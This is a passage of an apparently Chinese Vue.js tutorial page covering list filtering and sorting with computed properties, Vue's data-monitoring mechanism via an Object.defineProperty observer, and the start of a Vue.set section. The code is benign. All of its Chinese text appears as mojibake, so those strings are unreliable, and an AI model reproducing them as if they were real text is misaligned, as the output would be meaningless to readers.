&#x27;ç”·&#x27; &#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">],</span></span><br><span class="hljs-comment"><span class="language-javascript">filPersons: []</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">watch: &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">keyWord: &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">immediate: true,</span></span><br><span class="hljs-comment"><span class="language-javascript">handler(val) &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">this.filPersons = this.persons.filter((p) =&gt; &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">return p.name.indexOf(val) !== -1</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;)</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;) */</span></span><br><span class="language-javascript">  <span class="hljs-comment">//#endregion</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// ç”¨ computed å®ç°</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">keyWord</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">persons</span>: [</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;001&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;é©¬å†¬æ¢…&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;å¥³&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;002&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å‘¨å†¬é›¨&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;å¥³&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;003&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å‘¨æ°ä¼¦&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;ç”·&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;004&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;æ¸©å…†ä¼¦&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">22</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;ç”·&#x27;</span> &#125;</span><br><span class="language-javascript">      ]</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">filPersons</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">keyWord</span>) !== -<span class="hljs-number">1</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;) </span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221112213931286.png" alt="image-20221112213931286"></p><h3 id="åˆ—è¡¨æ’åº"><a href="#åˆ—è¡¨æ’åº" class="headerlink" title="åˆ—è¡¨æ’åº"></a>åˆ—è¡¨æ’åº</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>åˆ—è¡¨æ’åº<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>äººå‘˜åˆ—è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;è¯·è¾“å…¥åå­—&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;keyWord&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType = 2&quot;</span>&gt;</span>å¹´é¾„å‡åº<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType = 1&quot;</span>&gt;</span>å¹´é¾„é™åº<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType = 0&quot;</span>&gt;</span>åŸé¡ºåº<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of filPersons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;p.id&quot;</span>&gt;</span><br>      &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">keyWord</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">sortType</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// 0åŸé¡ºåº 1é™åº 2å‡åº</span></span><br><span class="language-javascript">      <span class="hljs-attr">persons</span>: [</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;001&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;é©¬å†¬æ¢…&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;å¥³&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;002&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å‘¨å†¬é›¨&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">31</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;å¥³&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;003&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å‘¨æ°ä¼¦&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;ç”·&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;004&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;æ¸©å…†ä¼¦&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;ç”·&#x27;</span> &#125;</span><br><span class="language-javascript">      ]</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">filPersons</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> arr = <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">keyWord</span>) !== -<span class="hljs-number">1</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        <span class="hljs-comment">//åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦éœ€è¦æ’åº</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">sortType</span>) &#123;</span><br><span class="language-javascript">          arr.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">p1, p2</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">sortType</span> === <span class="hljs-number">1</span> ? p2.<span class="hljs-property">age</span> - p1.<span class="hljs-property">age</span> : p1.<span class="hljs-property">age</span> - p2.<span class="hljs-property">age</span></span><br><span class="language-javascript">          &#125;)</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> arr</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1379492/1643211061137-37aec6e3-9594-434d-b2d9-d31f752992e1.png" alt="image.png"></p><h2 id="1-14-vue-ç›‘æµ‹data-ä¸­çš„-æ•°æ®"><a href="#1-14-vue-ç›‘æµ‹data-ä¸­çš„-æ•°æ®" class="headerlink" title="1.14 vue ç›‘æµ‹data ä¸­çš„ æ•°æ®"></a>1.14 vue ç›‘æµ‹data ä¸­çš„ æ•°æ®</h2><p>å…ˆæ¥ä¸ªæ¡ˆä¾‹å¼•å…¥ä¸€ä¸‹ï¼š</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>äººå‘˜åˆ—è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateMei&quot;</span>&gt;</span>æ›´æ–°é©¬å†¬æ¢…çš„ä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of persons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;p.id&quot;</span>&gt;</span><br>            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">persons</span>:[</span><br><span class="language-javascript">                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;é©¬å†¬æ¢…&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">30</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;å¥³&#x27;</span>&#125;,</span><br><span class="language-javascript">                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å‘¨å†¬é›¨&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">31</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;å¥³&#x27;</span>&#125;,</span><br><span class="language-javascript">                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å‘¨æ°ä¼¦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;ç”·&#x27;</span>&#125;,</span><br><span class="language-javascript">                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;004&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;æ¸©å…†ä¼¦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">19</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;ç”·&#x27;</span>&#125;</span><br><span class="language-javascript">            ]</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">updateMei</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// this.persons[0].name = &#x27;é©¬è€å¸ˆ&#x27; //å¥æ•ˆ</span></span><br><span class="language-javascript">                <span class="hljs-comment">// this.persons[0].age = 50 //å¥æ•ˆ</span></span><br><span class="language-javascript">                <span class="hljs-comment">// this.persons[0].sex = &#x27;ç”·&#x27; //å¥æ•ˆ</span></span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>[<span class="hljs-number">0</span>] = &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;é©¬è€å¸ˆ&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">50</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;ç”·&#x27;</span>&#125; <span class="hljs-comment">//ä¸å¥æ•ˆ</span></span><br><span class="language-javascript">                <span class="hljs-comment">// this.persons.splice(0,1,&#123;id:&#x27;001&#x27;,name:&#x27;é©¬è€å¸ˆ&#x27;,age:50,sex:&#x27;ç”·&#x27;&#125;)</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;) </span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>ç‚¹å‡»æ›´æ–°é©¬å†¬æ¢…çš„ä¿¡æ¯ï¼Œé©¬å†¬æ¢…çš„æ•°æ®å¹¶æ²¡æœ‰å‘ç”Ÿæ”¹å˜ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114422193.png" alt="image-20221124114422193"></p><p>æˆ‘ä»¬æ¥çœ‹çœ‹æ§åˆ¶å°ï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114436786.png" alt="image-20221124114436786"></p><p>æ§åˆ¶å°ä¸Šçš„æ•°æ®å‘ç”Ÿäº†æ”¹å˜ï¼Œè¯´æ˜ï¼Œè¿™ä¸ªæ›´æ”¹çš„æ•°æ®å¹¶æ²¡æœ‰è¢« vue ç›‘æµ‹åˆ°ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æ¥ç ”ç©¶ä¸€ä¸‹ Vue ç›‘æµ‹çš„åŸç†ã€‚</p><p>æˆ‘ä»¬å…ˆç ”ç©¶ Vue å¦‚ä½•ç›‘æµ‹ å¯¹è±¡é‡Œçš„æ•°æ®</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åç§°ï¼š&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åœ°å€ï¼š&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">//é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å®¶é‡Œè¹²å¤§å­¦&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;China&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">student</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;tom&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">age</span>:&#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">rAge</span>:<span class="hljs-number">40</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">sAge</span>:<span class="hljs-number">29</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">friends</span>:[</span><br><span class="language-javascript">                    &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jerry&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">35</span>&#125;</span><br><span class="language-javascript">                ]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è®²ä¸€ä¸‹è§£ææ¨¡æ¿åé¢çš„æ“ä½œâ€”ã€‹è°ƒç”¨ set æ–¹æ³•æ—¶ï¼Œå°±ä¼šå»è§£ææ¨¡æ¿â€”â€“&gt;ç”Ÿæˆæ–°çš„è™šæ‹Ÿ DOMâ€”â€“&gt;æ–°æ—§DOM å¯¹æ¯” â€”â€“&gt; æ›´æ–°é¡µé¢</p></blockquote><p>æ¨¡æ‹Ÿä¸€ä¸‹ vue ä¸­çš„ æ•°æ®ç›‘æµ‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html">     <span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> data = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å°šç¡…è°·&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;åŒ—äº¬&#x27;</span>,</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªç›‘è§†çš„å®ä¾‹å¯¹è±¡ï¼Œç”¨äºç›‘è§†dataä¸­å±æ€§çš„å˜åŒ–</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> obs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>(data)</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obs)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//å‡†å¤‡ä¸€ä¸ªvmå®ä¾‹å¯¹è±¡</span></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> vm = &#123;&#125;</span><br><span class="language-javascript">    vm.<span class="hljs-property">_data</span> = data = obs</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Observer</span>(<span class="hljs-params">obj</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">//æ±‡æ€»å¯¹è±¡ä¸­æ‰€æœ‰çš„å±æ€§å½¢æˆä¸€ä¸ªæ•°ç»„</span></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> keys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj)</span><br><span class="language-javascript">        <span class="hljs-comment">//éå†</span></span><br><span class="language-javascript">        keys.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">k</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-variable language_">this</span>, k, &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> obj[k]</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">set</span>(<span class="hljs-params">val</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;k&#125;</span>è¢«æ”¹äº†ï¼Œæˆ‘è¦å»è§£ææ¨¡æ¿ï¼Œç”Ÿæˆè™šæ‹ŸDOM.....æˆ‘è¦å¼€å§‹å¿™äº†`</span>)</span><br><span class="language-javascript">                    obj[k] = val</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114942841.png" alt="image-20221124114942841"></p><p><strong>Vue.set çš„ä½¿ç”¨</strong></p><p><code>Vue.set(targetï¼ŒpropertyName/indexï¼Œvalue)</code> æˆ–</p><p><code>vm.$set(targetï¼ŒpropertyName/indexï¼Œvalue)</code></p><p><strong>ç”¨æ³•</strong> ï¼š</p><p>å‘å“åº”å¼å¯¹è±¡ä¸­æ·»åŠ 